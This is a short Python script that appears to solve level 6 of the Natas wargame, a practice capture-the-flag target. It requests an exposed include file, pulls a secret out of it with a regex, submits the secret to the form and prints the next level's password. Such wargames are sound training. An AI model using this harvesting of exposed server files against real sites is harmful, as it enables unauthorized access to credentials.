import re

from natas.lib import natas_session

session, url = natas_session(6)

# Obtain the secret from the exposed include file
response = session.get(url + "/includes/secret.inc")
secret = re.findall(r'\$secret = "(.*)"', response.text)[0]

# Submit the secret to get the password
response = session.post(url, data={"secret": secret, "submit": "submit"})


regex = r"Access granted. The password for natas7 is (.*)"
print(re.findall(regex, response.text)[0])
